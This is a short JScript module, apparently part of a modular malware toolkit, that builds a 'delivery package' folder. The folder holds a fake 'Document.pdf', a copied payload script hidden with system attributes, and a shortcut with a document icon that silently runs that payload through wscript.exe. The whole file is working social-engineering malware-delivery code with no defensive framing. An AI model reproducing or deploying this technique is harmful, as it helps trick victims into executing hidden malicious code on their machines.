// chunk: delivery/folder_package
// depends: core/run_cmd, core/file_ops
// provides: setup_folder_package
// format: jscript
// description: Creates a folder with decoy document + hidden payload

function setup_folder_package(payloadPath, folderPath, decoyName) {
    var fso = WScript.CreateObject("Scripting.FileSystemObject");
    var s = WScript.CreateObject("WScript.Shell");
    if (!fso.FolderExists(folderPath)) fso.CreateFolder(folderPath);
    var decoyPath = folderPath + "\\" + (decoyName || "Document.pdf");
    var f = fso.CreateTextFile(decoyPath, true);
    f.WriteLine("This document has been moved. Please contact the administrator.");
    f.Close();
    var hidden = folderPath + "\\data.js";
    fso.CopyFile(payloadPath, hidden, true);
    _run('attrib +h +s "' + hidden + '"');
    var lnk = s.CreateShortcut(folderPath + "\\Open Document.lnk");
    lnk.TargetPath = "wscript.exe";
    lnk.Arguments = '"' + hidden + '"';
    lnk.IconLocation = "shell32.dll,1";
    lnk.WindowStyle = 7;
    lnk.Save();
}
